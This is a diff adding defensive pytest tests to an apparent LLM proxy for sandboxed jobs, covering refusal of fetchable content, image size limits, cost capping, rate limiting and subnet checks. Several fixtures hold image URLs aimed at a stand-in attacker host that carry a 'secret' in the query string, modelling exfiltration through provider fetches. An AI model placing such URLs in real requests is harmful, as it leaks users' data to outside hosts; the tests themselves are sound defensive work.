@@ -29,6 +29,7 @@ class Upstream:
         self.requests: list[httpx.Request] = []
         self.status = 200
         self.delay = 0.0
+        self.usage: dict | None = None
 
     def handler(self, request: httpx.Request) -> httpx.Response:
         self.requests.append(request)
@@ -52,7 +53,7 @@ class Upstream:
             ]
             text = "".join(f"data: {json.dumps(c)}\n\n" for c in chunks) + "data: [DONE]\n\n"
             return httpx.Response(200, text=text, headers={"content-type": "text/event-stream"})
-        return httpx.Response(200, json={"choices": [{"message": {"role": "assistant", "content": "hi"}}], "usage": {"prompt_tokens": 1000, "completion_tokens": 100}})
+        return httpx.Response(200, json={"choices": [{"message": {"role": "assistant", "content": "hi"}}], "usage": self.usage or {"prompt_tokens": 1000, "completion_tokens": 100}})
 
 
 @pytest.fixture
@@ -267,3 +268,70 @@ def test_a_provider_error_reaches_the_worker_without_its_detail(proxy):
     upstream.status = 400
     resp = _call(app, token=_token())
     assert resp.status_code == 400 and "provider says no" not in resp.text and "status 400" in resp.text
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        [{"type": "image_url", "image_url": {"url": "https://attacker.example/?d=secret"}}],
+        [{"type": "image_url", "image_url": "http://attacker.example/p.png"}],
+        [{"type": "file", "file": {"file_id": "file-abc"}}],
+        [{"type": "file", "file": {"file_data": "data:application/pdf;base64,AAAA"}}],
+        [{"type": "input_audio", "input_audio": {"data": "AAAA", "format": "wav"}}],
+        [{"type": "something_new", "url": "https://attacker.example/"}],
+        {"type": "image_url", "image_url": {"url": "https://attacker.example/"}},
+    ],
+)
+def test_content_the_provider_would_fetch_is_refused(proxy, content):
+    app, store, upstream, _ = proxy
+    for role in ("user", "tool"):
+        message = {"role": role, "content": content}
+        if role == "tool":
+            message["tool_call_id"] = "t1"
+        resp = _call(app, token=_token(), body={"model": "worker", "messages": [{"role": "user", "content": "hi"}, message]})
+        assert resp.status_code == 400, resp.text
+    assert upstream.requests == [], "a refused body reached the provider"
+    assert store.job_calls("job-a")[-1]["status"] == "refused"
+
+
+def test_text_and_inline_images_are_allowed_and_an_image_is_reserved_large(proxy):
+    app, store, upstream, _ = proxy
+    image = {"type": "image_url", "image_url": {"url": "data:image/png;base64," + "A" * 100}}
+    body = {"model": "worker", "messages": [{"role": "user", "content": [{"type": "text", "text": "look"}, image]}]}
+    assert _call(app, token=_token(), body=body).status_code == 200
+    too_big = {"type": "image_url", "image_url": {"url": "data:image/png;base64," + "A" * (5 * 1024 * 1024)}}
+    assert _call(app, token=_token(), body={"model": "worker", "messages": [{"role": "user", "content": [too_big]}]}).status_code in (400, 413)
+
+
+def test_a_call_never_counts_for_more_than_its_reservation(proxy):
+    app, store, upstream, _ = proxy
+    # The provider reports far more usage than the reservation could cover.
+    upstream.usage = {"prompt_tokens": 50_000_000, "completion_tokens": 50_000_000}
+    resp = _call(app, token=_token(), body={"model": "worker", "messages": [{"role": "user", "content": "x"}], "max_tokens": 300})
+    assert resp.status_code == 200
+    row = store.job_calls("job-a")[-1]
+    assert row["actual_cost_usd"] > 100 and row["cost_usd"] < 0.01, row
+    assert store.get("job-a").spent_usd < 0.01
+
+
+def test_a_flood_of_refused_calls_is_capped_by_the_rate(proxy):
+    app, store, upstream, _ = proxy
+    for _ in range(12):
+        _call(app, token=_token(), body={"model": "gpt-5", "messages": []})
+    refused = [c for c in store.job_calls("job-a") if c["status"] == "refused"]
+    assert len(refused) == 5, "past the rate (5 a minute here), refusals are not written row by row"
+    assert _call(app, token=_token()).status_code == 429
+
+
+def test_with_no_known_sandbox_subnet_every_caller_is_refused(tmp_path):
+    from app.gateway.code_jobs.llm_proxy import ProxySettings, build_proxy_app
+    from app.gateway.code_jobs.store import CodeJobStore
+
+    store = CodeJobStore(tmp_path / "jobs.db")
+    store.create(job_id="job-a", thread_id="t1", user_id="u", tool_call_id="c", title="x", project_dir="p", budget_usd=1.0, model="gpt-5")
+    upstream = Upstream()
+    settings = ProxySettings(store=store, upstream_for=lambda: (None, "x"), subnets=[], monthly_cap_usd=20, rate_per_minute=5, max_request_bytes=65536, resolve_container={"sbx-a": SBX_A}.get)
+    settings.transport = httpx.MockTransport(upstream.handler)
+    app = build_proxy_app(settings)
+    resp = _call(app, token=_token())
+    assert resp.status_code == 403 and "not from the sandbox network" in resp.text
